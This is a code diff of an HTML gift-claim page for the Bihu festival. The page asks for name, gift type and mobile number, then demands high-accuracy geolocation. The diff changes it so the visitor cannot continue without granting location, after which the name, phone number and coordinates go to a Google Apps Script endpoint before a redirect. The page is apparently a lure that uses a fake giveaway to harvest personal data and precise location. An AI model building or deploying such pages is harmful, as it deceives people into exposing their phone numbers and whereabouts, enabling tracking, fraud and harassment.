@@ -23,22 +23,17 @@
       box-shadow:0 0 20px rgba(0,0,0,0.3);
       text-align:center;
     }
-    h2{
-      color:#e65100;
-      margin-bottom:20px;
-    }
+    h2{ color:#e65100; }
     input{
       width:100%;
       padding:12px;
       margin:8px 0;
       border-radius:8px;
       border:1px solid #ccc;
-      font-size:15px;
     }
     button{
       width:100%;
       padding:12px;
-      margin-top:10px;
       border:none;
       border-radius:10px;
       background:#2e7d32;
@@ -46,14 +41,7 @@
       font-size:16px;
       cursor:pointer;
     }
-    button:hover{
-      background:#1b5e20;
-    }
-    #status{
-      margin-top:12px;
-      font-weight:bold;
-      color:#d84315;
-    }
+    #status{ margin-top:12px; font-weight:bold; color:#d84315; }
   </style>
 </head>
 
@@ -64,12 +52,9 @@
 
   <input type="text" name="name" placeholder="Your Name" required>
   <input type="text" name="reason" placeholder="Gift Type" required>
-
-  <!-- 🔴 10 digit mobile only -->
   <input type="tel" name="mobile"
          placeholder="10-digit Mobile Number"
          maxlength="10"
-         pattern="[0-9]{10}"
          required>
 
   <button type="submit">Received Gift 🎉</button>
@@ -83,22 +68,26 @@ const statusText = document.getElementById("status");
 form.addEventListener("submit", function(e){
   e.preventDefault();
 
-  const mobile = form.mobile.value.trim();
-
-  // 🔴 MOBILE VALIDATION
-  if (!/^[0-9]{10}$/.test(mobile)) {
-    statusText.innerText = "❌ Please enter a valid 10-digit mobile number";
+  // mobile validation
+  if (!/^[0-9]{10}$/.test(form.mobile.value)) {
+    statusText.innerText = "❌ Enter valid 10-digit mobile number";
     return;
   }
 
-  statusText.innerText = "📍  zx famly";
+  statusText.innerText = "📍 Please allow location…";
 
-  // save name for next pages
+  // save name
   localStorage.setItem("bihuName", form.name.value);
 
   navigator.geolocation.getCurrentPosition(
-    pos => sendData(pos),
-    err => sendData(null),
+    function(position){
+      // ✅ ONLY IF LOCATION ALLOWED
+      sendData(position);
+    },
+    function(){
+      // ❌ LOCATION DENIED
+      statusText.innerText = "❌ Location is required to continue";
+    },
     { enableHighAccuracy:true, timeout:15000 }
   );
 });
@@ -108,9 +97,9 @@ function sendData(position){
     name: form.name.value,
     reason: form.reason.value,
     mobile: form.mobile.value,
-    latitude: position ? position.coords.latitude : "",
-    longitude: position ? position.coords.longitude : "",
-    accuracy: position ? position.coords.accuracy : ""
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy
   };
 
   fetch("https://script.google.com/macros/s/AKfycbz3rQv9nyn-B_NNyy2Vyj6WN2hZcsFgpncziEsCGhn4sB-Cwm-gP52RnvphqzH1QxCL/exec",{
@@ -120,6 +109,7 @@ function sendData(position){
     body: JSON.stringify(data)
   });
 
+  // 👉 redirect ONLY after location
   window.location.href = "bihuz.html";
 }
 </script>
